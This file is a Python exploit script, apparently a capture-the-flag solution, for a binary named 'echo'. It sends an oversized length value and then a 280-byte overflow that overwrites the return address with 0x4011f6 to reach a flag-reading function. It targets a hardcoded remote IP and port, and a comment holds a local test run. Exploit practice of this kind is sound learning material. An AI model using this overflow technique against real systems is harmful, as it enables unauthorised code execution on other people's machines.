from ptrlib import *
 
'''
# local exploit
$ echo -e '2147483648\nAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4\xf6\x11\x40\x00\x00\x00\x00\x00\x00' | ./echo 

Size: Data: Received: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4?@

/bin/cat: /flag.txt: No such file or directory
'''

elf = ELF("./echo")
#sock = Process("./echo")
#sock = Socket('127.0.0.1', 5000)
sock = Socket('34.170.146.252', 58519)

print(sock.recv(5).decode("utf-8")) # Size:

payload =  b'2147483648'
payload += b'\n'
payload += b'A' * 280
payload += p64(0x4011f6)
#payload += p64(elf.symbol("win"))

#print(payload)
sock.sendline(payload)

### leak flag ###
print(sock.recvline())
print(sock.recvline().decode("utf-8"))
